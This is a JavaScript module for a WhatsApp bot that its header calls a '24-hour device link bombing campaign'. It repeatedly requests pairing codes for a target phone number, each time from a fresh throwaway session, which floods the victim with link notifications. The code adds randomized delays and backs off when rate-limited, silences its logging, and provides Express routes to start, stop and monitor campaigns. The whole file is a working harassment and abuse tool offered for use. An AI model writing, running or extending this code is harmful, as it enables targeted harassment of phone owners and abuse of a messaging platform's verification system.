// ============================================================
// MODULE: spampair.js
// WhatsApp Bot command: .spampair <phone_number>
// Starts a 24-hour device link bombing campaign against the target
//
// CRITICAL: requestPairingCode must be called WHILE the socket
// is still connecting (before QR), NOT after waiting for 'open'.
// Pattern from pair.js: create socket → setTimeout → requestPairingCode
// ============================================================

const express = require('express');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const EventEmitter = require('events');

// ---------- CONFIGURATION ----------
const DEFAULT_DURATION_HOURS = 24;
const REQUEST_DELAY_MIN_MS = 10000;
const REQUEST_DELAY_MAX_MS = 15000;
const SOCKET_TIMEOUT_MS = 15000;

// ---------- STATE ----------
const activeCampaigns = new Map();

class SpamPair extends EventEmitter {
  constructor(phoneNumber, durationHours = DEFAULT_DURATION_HOURS) {
    super();
    this.phone = this._formatNumber(phoneNumber);
    this.durationMs = durationHours * 60 * 60 * 1000;
    this.stopFlag = false;
    this.stats = { attempts: 0, success: 0, errors: 0 };
    this.sessionId = crypto.randomBytes(8).toString('hex');
    this._runLoop = this._runLoop.bind(this);
    this._baileys = null;
    this._browser = null;
  }

  _formatNumber(num) {
    return String(num || '').replace(/\D/g, '');
  }

  _randomDelay() {
    return Math.floor(Math.random() * (REQUEST_DELAY_MAX_MS - REQUEST_DELAY_MIN_MS + 1)) + REQUEST_DELAY_MIN_MS;
  }

  _sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  _ensureBaileys() {
    if (!this._baileys) {
      try {
        const { createRequire } = require('module');
        const baileysPkg = path.join(__dirname, '..', '..', 'whatsapp-bot', 'node_modules', '@whiskeysockets', 'baileys', 'package.json');
        const baileysRequire = createRequire(baileysPkg);
        const baileys = baileysRequire("@whiskeysockets/baileys");
        const {
          default: makeWASocket,
          DisconnectReason,
          fetchLatestBaileysVersion,
          Browsers,
          useMultiFileAuthState
        } = baileys;
        this._baileys = { makeWASocket, DisconnectReason, fetchLatestBaileysVersion, Browsers, useMultiFileAuthState };
        this._browser = Browsers?.ubuntu('Chrome');
      } catch (_be) {
        throw new Error('Baileys library not available: ' + (_be.message || ''));
      }
    }
    return this._baileys;
  }

  // ---------- ONE ATTEMPT — fresh socket per attempt ----------
  async _attemptLink() {
    const {
      makeWASocket,
      useMultiFileAuthState,
      fetchLatestBaileysVersion,
      Browsers
    } = this._ensureBaileys();

    // Use a temp session dir so each attempt starts with fresh creds.
    // After each attempt we delete it — no persistent identity needed.
    const attemptId = crypto.randomBytes(4).toString('hex');
    const sessionDir = path.join(__dirname, '..', '..', 'spampair_sessions', attemptId);
    fs.mkdirSync(sessionDir, { recursive: true });

    let sock = null;
    let connTimeout = null;
    let pairingTimeout = null;
    let cleanupDone = false;

    const cleanup = () => {
      if (cleanupDone) return;
      cleanupDone = true;
      if (connTimeout) clearTimeout(connTimeout);
      if (pairingTimeout) clearTimeout(pairingTimeout);
      if (sock) {
        try { sock.end(new Error('SpamPair: done')); } catch (_) {}
        sock = null;
      }
      // Clean up session files
      try { fs.rmSync(sessionDir, { recursive: true, force: true }); } catch (_) {}
    };

    return new Promise((resolve) => {
      (async () => {
        try {
          const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
          const { version } = await fetchLatestBaileysVersion();

          // Socket-level killswitch
          const abortController = new AbortController();

          sock = makeWASocket({
            version,
            browser: this._browser || Browsers.ubuntu('Chrome'),
            auth: {
              creds: state.creds,
              keys: state.keys
            },
            generateHighQualityLinkPreview: false,
            shouldSyncHistoryMessage: () => false,
            getMessage: async () => undefined,
            connectTimeoutMs: 10000,
            defaultQueryTimeoutMs: 10000,
            // Quiet logger — don't pollute backend logs
            logger: { info: () => {}, warn: () => {}, error: () => {}, trace: () => {}, debug: () => {}, child: () => ({ info: () => {}, warn: () => {}, error: () => {}, trace: () => {}, debug: () => {} }) }
          });

          sock.ev.on('creds.update', saveCreds);

          // 1) CONNECTION TIMEOUT — if socket doesn't connect fast enough, fail
          connTimeout = setTimeout(() => {
            if (!cleanupDone) {
              cleanup();
              resolve(false);
            }
          }, SOCKET_TIMEOUT_MS);

          // 2) KEY MOMENT: call requestPairingCode AFTER socket creation,
          //    BEFORE it fully opens (during the connecting/handshake phase).
          //    This is the exact pattern from pair.js setTimeout.
          pairingTimeout = setTimeout(async () => {
            try {
              const code = await sock.requestPairingCode(this.phone);
              const codeStr = String(code || '');
              console.log(`[SpamPair] ✅ CODE RECEIVED for ${this.phone}: ${codeStr.slice(0,4)}-${codeStr.slice(4,8)} (${codeStr.length} digits)`);

              // A real pairing code = WhatsApp processed the request and sent
              // a push notification to the target phone. The code is 6-8 digits.
              if (codeStr.length >= 6) {
                this.stats.attempts++;
                this.stats.success++;
                cleanup();
                resolve(true);
              } else {
                // Too short — probably not a real code
                console.log(`[SpamPair] ⚠️ Short code (${codeStr.length} chars) — might be fake`);
                this.stats.attempts++;
                this.stats.errors++;
                cleanup();
                resolve(false);
              }
            } catch (pairErr) {
              const errMsg = pairErr?.message || String(pairErr || '').slice(0, 100);
              console.log(`[SpamPair] ❌ requestPairingCode FAILED: ${errMsg}`);
              this.stats.attempts++;
              this.stats.errors++;
              cleanup();
              resolve(false);
            }
          }, 500); // Small delay to let socket start handshaking

          // 3) Listen for connection errors — if socket dies, fail cleanly
          const connEvtHandler = (update) => {
            if (update.lastDisconnect?.error && !cleanupDone) {
              // Socket disconnected before we got the pairing code
              if (pairingTimeout) clearTimeout(pairingTimeout);
              this.stats.attempts++;
              this.stats.errors++;
              cleanup();
              resolve(false);
            }
            // If socket opens successfully before we get the code, the
            // pairing would have already been sent (the timeout fires at 500ms).
            // We can close the socket and count as success if code was received.
            if (update.connection === 'open' && !cleanupDone) {
              // Socket opened — requestPairingCode already fired at 500ms.
              // Wait 1s for the code response, then clean up.
              setTimeout(() => {
                if (!cleanupDone) {
                  // requestPairingCode didn't return — fail
                  cleanup();
                  resolve(false);
                }
              }, 3000);
            }
          };
          sock.ev.on('connection.update', connEvtHandler);

        } catch (err) {
          // Setup failed (auth state, version fetch, etc.)
          this.stats.attempts++;
          this.stats.errors++;
          cleanup();
          resolve(false);
        }
      })();
    });
  }

  // ---------- MAIN LOOP ----------
  async _runLoop() {
    const startTime = Date.now();
    this._startTime = startTime;
    this.emit('start', { phone: this.phone, duration: this.durationMs });

    while (!this.stopFlag && (Date.now() - startTime) < this.durationMs) {
      const ok = await this._attemptLink();

      // Progress
      if (this.stats.attempts % 10 === 0 || (this.stats.attempts === 1)) {
        this.emit('progress', {
          phone: this.phone,
          attempts: this.stats.attempts,
          success: this.stats.success,
          errors: this.stats.errors,
          elapsed: Math.round((Date.now() - startTime) / 1000)
        });
      }

      // Rate-limit detection
      if (!ok && this.stats.errors > this.stats.success + 3) {
        // Lots of failures — slow down
        await this._sleep(this._randomDelay() + 3000);
      } else {
        await this._sleep(this._randomDelay());
      }

      // Rotate session id every 50 attempts
      if (this.stats.attempts % 50 === 0) {
        this.sessionId = crypto.randomBytes(8).toString('hex');
      }
    }

    this.emit('done', {
      phone: this.phone,
      totalAttempts: this.stats.attempts,
      totalSuccess: this.stats.success,
      totalErrors: this.stats.errors,
      durationSeconds: Math.round((Date.now() - startTime) / 1000)
    });
  }

  start() {
    if (this._timer) {
      this.emit('error', { phone: this.phone, message: 'Already running' });
      return;
    }
    this.stopFlag = false;
    this._runLoop().catch(err => this.emit('error', { phone: this.phone, error: err.message }));
    return this;
  }

  stop() {
    this.stopFlag = true;
    this.emit('stopped', { phone: this.phone, stats: this.stats });
    return this;
  }

  getStats() {
    return { phone: this.phone, ...this.stats, running: !this.stopFlag };
  }
}

// ================================================================
// EXPRESS ROUTES
// ================================================================

const router = express.Router();

router.post('/start', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) return res.status(400).json({ error: 'Missing phoneNumber' });
  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (activeCampaigns.has(cleanNumber)) {
    const campaign = activeCampaigns.get(cleanNumber);
    return res.json({ status: 'already_running', phone: cleanNumber, stats: campaign.stats });
  }
  const campaign = new SpamPair(phoneNumber);
  activeCampaigns.set(cleanNumber, { spamPair: campaign, stats: campaign.stats, startTime: Date.now() });
  campaign.start();
  res.json({ status: 'started', phone: cleanNumber, sessionId: campaign.sessionId, durationHours: DEFAULT_DURATION_HOURS });
});

router.post('/stop', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) return res.status(400).json({ error: 'Missing phoneNumber' });
  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (!activeCampaigns.has(cleanNumber)) return res.status(404).json({ error: 'No active campaign for this number', phone: cleanNumber });
  const entry = activeCampaigns.get(cleanNumber);
  entry.spamPair.stop();
  activeCampaigns.delete(cleanNumber);
  res.json({ status: 'stopped', phone: cleanNumber, stats: entry.stats });
});

router.get('/status', (req, res) => {
  if (activeCampaigns.size === 0) return res.json({ campaigns: [] });
  const campaigns = [];
  for (const [phone, entry] of activeCampaigns) {
    campaigns.push({ phone, stats: entry.spamPair.getStats(), running: !entry.spamPair.stopFlag, startedAt: entry.startTime });
  }
  res.json({ campaigns });
});

module.exports = router;
module.exports.SpamPair = SpamPair;
module.exports.activeCampaigns = activeCampaigns;
